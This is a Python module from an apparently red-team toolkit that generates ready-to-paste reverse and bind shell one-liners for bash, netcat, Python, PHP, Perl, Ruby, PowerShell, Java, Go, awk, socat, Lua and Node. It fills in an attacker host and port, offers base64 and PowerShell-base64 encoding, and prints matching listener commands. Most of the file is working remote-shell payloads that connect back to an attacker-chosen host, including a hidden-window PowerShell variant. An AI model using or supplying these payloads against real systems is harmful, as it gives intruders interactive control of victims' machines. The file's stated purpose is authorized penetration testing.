"""Reverse / bind shell one-liner generator.

Purely offline, deterministic payload *generation* -- this module never executes
anything it produces. It emits ready-to-paste one-liners for a large catalogue
of interpreters/tools (bash, python, php, powershell, socat, ...), substituting
the operator-supplied ``lhost``/``lport``, applies an optional encoding
transform (url / base64 / powershell-base64), prints them to the console, and
writes them all to an artifact file. Matching listener hints are included.

No AI, no network, no third-party dependencies -- Python standard library only.
For AUTHORIZED red-team / lab use.
"""
from __future__ import annotations

import base64
import urllib.parse
from typing import Dict, List

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register


# Placeholder tokens substituted at generation time. Deliberately unusual so
# they never collide with the literal braces/quoting inside a payload body
# (which rules out ``str.format`` here).
_H = "__LHOST__"
_P = "__LPORT__"

# All shells understood by this module (order defines console/artifact order).
SHELLS: List[str] = [
    "bash", "sh", "nc", "ncat", "python", "python3", "php", "perl", "ruby",
    "powershell", "pwsh", "java", "golang", "awk", "socat", "lua", "node",
]

# --------------------------------------------------------------------------- #
# Reverse-shell templates: target connects back to the operator's listener.    #
# --------------------------------------------------------------------------- #
REVERSE: Dict[str, str] = {
    "bash": f"bash -i >& /dev/tcp/{_H}/{_P} 0>&1",
    # POSIX sh has no ``>&``; use an explicit fd redirected onto /dev/tcp.
    "sh": f"0<&196;exec 196<>/dev/tcp/{_H}/{_P}; sh <&196 >&196 2>&196",
    # ``-e`` is stripped from most modern netcats; the mkfifo trick is portable.
    "nc": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {_H} {_P} >/tmp/f",
    "ncat": f"ncat {_H} {_P} -e /bin/bash",
    "python": (
        "python -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{_H}\",{_P}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "import pty;pty.spawn(\"/bin/sh\")'"
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{_H}\",{_P}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "import pty;pty.spawn(\"/bin/sh\")'"
    ),
    "php": f"php -r '$sock=fsockopen(\"{_H}\",{_P});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": (
        "perl -e 'use Socket;"
        f"$i=\"{_H}\";$p={_P};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");};'"
    ),
    "ruby": (
        "ruby -rsocket -e'"
        f"f=TCPSocket.open(\"{_H}\",{_P}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "powershell": (
        f"powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{_H}',{_P});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sby=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\""
    ),
    "java": (
        f"String host=\"{_H}\";int port={_P};"
        "String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
        "Socket s=new Socket(host,port);"
        "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();"
        "OutputStream po=p.getOutputStream(),so=s.getOutputStream();"
        "while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());"
        "while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());"
        "so.flush();po.flush();Thread.sleep(50);"
        "try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();"
    ),
    "golang": (
        "echo 'package main;import(\"os/exec\";\"net\");func main(){"
        f"c,_:=net.Dial(\"tcp\",\"{_H}:{_P}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'"
        " > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    ),
    "awk": (
        "awk 'BEGIN {"
        f"s = \"/inet/tcp/0/{_H}/{_P}\"; "
        "while(42) { do{ printf \"shell>\" |& s; s |& getline c; "
        "if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } "
        "while(c != \"exit\") close(s); }}' /dev/null"
    ),
    "socat": (
        f"socat TCP:{_H}:{_P} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    ),
    "lua": (
        "lua -e \"local s=require('socket');local t=s.tcp();"
        f"t:connect('{_H}',{_P});"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "node": (
        "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),"
        "sh=cp.spawn(\"/bin/sh\",[]);var c=new net.Socket();"
        f"c.connect({_P},\"{_H}\",function(){{"
        "c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})();'"
    ),
}

# --------------------------------------------------------------------------- #
# Bind-shell templates: target listens on lport, operator connects to it.      #
# (bash / sh have no native listening socket, so they are intentionally        #
#  absent from this table.)                                                     #
# --------------------------------------------------------------------------- #
BIND: Dict[str, str] = {
    "nc": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {_P} >/tmp/f",
    "ncat": f"ncat -lvnp {_P} -e /bin/bash",
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        f"s.bind((\"0.0.0.0\",{_P}));s.listen(1);c,a=s.accept();"
        "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
        "import pty;pty.spawn(\"/bin/sh\")'"
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        f"s.bind((\"0.0.0.0\",{_P}));s.listen(1);c,a=s.accept();"
        "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
        "import pty;pty.spawn(\"/bin/sh\")'"
    ),
    "php": (
        "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);"
        f"socket_bind($s,\"0.0.0.0\",{_P});socket_listen($s,1);$c=socket_accept($s);"
        "while(1){$cmd=socket_read($c,4096);$o=shell_exec($cmd);socket_write($c,$o);}'"
    ),
    "perl": (
        "perl -e 'use Socket;"
        f"$p={_P};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);"
        "bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);"
        "for(;$p=accept(C,S);close C){"
        "open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");"
        "exec(\"/bin/sh -i\");};'"
    ),
    "ruby": (
        "ruby -rsocket -e '"
        f"f=TCPServer.new({_P}).accept.to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    ),
    "powershell": (
        f"powershell -nop -w hidden -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{_P});"
        "$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sby=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close();$l.Stop()\""
    ),
    "java": (
        f"int port={_P};ServerSocket ss=new ServerSocket(port);Socket s=ss.accept();"
        "String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();"
        "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();"
        "OutputStream po=p.getOutputStream(),so=s.getOutputStream();"
        "while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());"
        "while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());"
        "so.flush();po.flush();Thread.sleep(50);"
        "try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();ss.close();"
    ),
    "golang": (
        "echo 'package main;import(\"os/exec\";\"net\");func main(){"
        f"l,_:=net.Listen(\"tcp\",\"0.0.0.0:{_P}\");c,_:=l.Accept();"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'"
        " > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    ),
    "awk": (
        "awk 'BEGIN {"
        f"s = \"/inet/tcp/{_P}/0/0\"; "
        "while(42) { do{ printf \"shell>\" |& s; s |& getline c; "
        "if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } "
        "while(c != \"exit\") close(s); }}' /dev/null"
    ),
    "socat": (
        f"socat TCP-LISTEN:{_P},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
    ),
    "lua": (
        "lua -e \"local s=require('socket');local srv=assert(s.bind('0.0.0.0',"
        f"{_P}));local c=srv:accept();os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "node": (
        "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\");"
        f"var srv=net.createServer(function(c){{var sh=cp.spawn(\"/bin/sh\",[]);"
        "c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});"
        f"srv.listen({_P},\"0.0.0.0\");}})();'"
    ),
}

# ``pwsh`` (PowerShell Core, cross-platform) uses syntax identical to Windows
# ``powershell``; only the launcher executable differs. Derive its payloads from
# the powershell templates so the advertised ``pwsh`` choice actually produces a
# payload (both directly and as part of ``shell=all``).
REVERSE["pwsh"] = REVERSE["powershell"].replace("powershell -nop", "pwsh -nop", 1)
BIND["pwsh"] = BIND["powershell"].replace("powershell -nop", "pwsh -nop", 1)


def _substitute(template: str, lhost: str, lport: int) -> str:
    """Fill a payload template with the concrete lhost/lport values."""
    return template.replace(_H, lhost).replace(_P, str(lport))


def _encode(command: str, scheme: str) -> str:
    """Apply an optional encoding transform to a raw payload string.

    - ``""``                -> unchanged
    - ``url``               -> percent-encode everything
    - ``base64``            -> standard base64 of the UTF-8 bytes
    - ``powershell-base64`` -> base64 of UTF-16LE bytes (for ``powershell -enc``)
    """
    if not scheme:
        return command
    if scheme == "url":
        return urllib.parse.quote(command, safe="")
    if scheme == "base64":
        return base64.b64encode(command.encode("utf-8")).decode("ascii")
    if scheme == "powershell-base64":
        return base64.b64encode(command.encode("utf-16-le")).decode("ascii")
    # Unknown scheme should never reach here (Option.choices guards it), but be
    # defensive rather than raise.
    return command


def _listener_hints(shell_type: str, lhost: str, lport: int) -> List[str]:
    """Return operator-side listener/connect hints appropriate for the type."""
    if shell_type == "bind":
        # Target is listening; the operator *connects* to it.
        return [
            f"nc -v {lhost} {lport}",
            f"ncat -v {lhost} {lport}",
            f"socat -,raw,echo=0 TCP:{lhost}:{lport}",
        ]
    # Reverse: operator *listens* for the incoming connection.
    return [
        f"nc -lvnp {lport}",
        f"rlwrap -cAr nc -lvnp {lport}",
        f"ncat -lvnp {lport}",
        f"socat -d -d TCP-LISTEN:{lport},reuseaddr FILE:`tty`,raw,echo=0",
    ]


@register
class RevShell(Module):
    """Generate reverse/bind shell one-liners for many interpreters (offline)."""

    name = "payloads.revshell"
    description = "Reverse/bind shell one-liner generator (offline, no execution)"
    phase = "payloads"
    options = [
        Option("lhost", help="Attacker/listener IP or hostname (reverse); bind ignores it for the payload", required=True),
        Option("lport", default=4444, help="Callback port (reverse) or listen port (bind)"),
        Option("type", default="reverse", choices=["reverse", "bind"],
               help="reverse = target connects back; bind = target listens"),
        Option("shell", default="all", choices=["all"] + SHELLS,
               help="Which interpreter to generate for, or 'all'"),
        Option("encode", default="", choices=["", "url", "base64", "powershell-base64"],
               help="Optional encoding of the generated payload(s)"),
    ]
    requires_tools = []  # generation only; nothing external is invoked
    references = [
        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md",
        "https://www.revshells.com/",
        "https://gtfobins.github.io/",
    ]

    def run(self, opts, ctx) -> Result:
        lhost = str(opts["lhost"]).strip()
        lport = opts["lport"]
        shell_type = opts["type"]
        shell = opts["shell"]
        encode = opts["encode"] or ""

        # -- validate the port softly (do not crash on odd input) -----------
        try:
            lport = int(lport)
        except (TypeError, ValueError):
            return Result(ok=False, summary=f"invalid lport: {opts['lport']!r}")
        if not (0 < lport < 65536):
            ctx.console.warn(f"lport {lport} is outside 1-65535; generating anyway")

        table = REVERSE if shell_type == "reverse" else BIND

        # -- select which shells to produce ---------------------------------
        if shell == "all":
            wanted = [s for s in SHELLS if s in table]
            skipped = [s for s in SHELLS if s not in table]
            if skipped and shell_type == "bind":
                ctx.console.debug(
                    "no native bind payload for: " + ", ".join(skipped)
                )
        else:
            if shell not in table:
                available = ", ".join(s for s in SHELLS if s in table)
                return Result(
                    ok=False,
                    summary=(
                        f"no {shell_type} payload for '{shell}'. "
                        f"{shell_type} supports: {available}"
                    ),
                )
            wanted = [shell]

        if not wanted:
            return Result(ok=False, summary=f"no {shell_type} payloads available to generate")

        # -- build payloads --------------------------------------------------
        raw_payloads: Dict[str, str] = {}
        payloads: Dict[str, str] = {}
        for name in wanted:
            raw = _substitute(table[name], lhost, lport)
            raw_payloads[name] = raw
            payloads[name] = _encode(raw, encode)

        listeners = _listener_hints(shell_type, lhost, lport)

        # -- console output --------------------------------------------------
        enc_note = f" [{encode}-encoded]" if encode else ""
        ctx.console.banner(
            f"{shell_type.upper()} SHELL PAYLOADS{enc_note}",
            f"LHOST={lhost}  LPORT={lport}  shells={len(payloads)}",
        )
        for name in wanted:
            ctx.console.good(name)
            ctx.console.raw(f"    {payloads[name]}")
            if encode:
                ctx.console.debug(f"    (raw) {raw_payloads[name]}")
            ctx.console.raw("")

        ctx.console.info("Listener / connect hints:")
        for hint in listeners:
            ctx.console.raw(f"    {hint}")

        # -- write artifact --------------------------------------------------
        lines: List[str] = [
            f"# redkit payloads.revshell",
            f"# type={shell_type} lhost={lhost} lport={lport} encode={encode or 'none'}",
            f"# GENERATION ONLY - review before use on AUTHORIZED targets",
            "",
            "## Listener / connect hints",
        ]
        lines.extend(f"  {h}" for h in listeners)
        lines.append("")
        lines.append("## Payloads")
        for name in wanted:
            lines.append(f"### {name}")
            lines.append(payloads[name])
            if encode:
                lines.append(f"# raw: {raw_payloads[name]}")
            lines.append("")

        art_path = ctx.artifact_path("revshells.txt")
        try:
            art_path.write_text("\n".join(lines), encoding="utf-8")
            artifacts = [str(art_path)]
        except OSError as exc:
            ctx.console.warn(f"could not write artifact: {exc}")
            artifacts = []

        # -- persist a note into the engagement -----------------------------
        try:
            ctx.engagement.add_note(
                f"Generated {len(payloads)} {shell_type} shell payload(s) "
                f"for {lhost}:{lport}"
                + (f" ({encode}-encoded)" if encode else "")
            )
        except Exception:  # engagement persistence must never break generation
            pass

        summary = (
            f"Generated {len(payloads)} {shell_type} payload(s) for "
            f"{lhost}:{lport}" + (f" ({encode}-encoded)" if encode else "")
        )
        data = {
            "type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "encode": encode,
            "shells": wanted,
            "payloads": payloads,
            "raw": raw_payloads,
            "listeners": listeners,
        }
        return Result(ok=True, summary=summary, data=data, artifacts=artifacts)
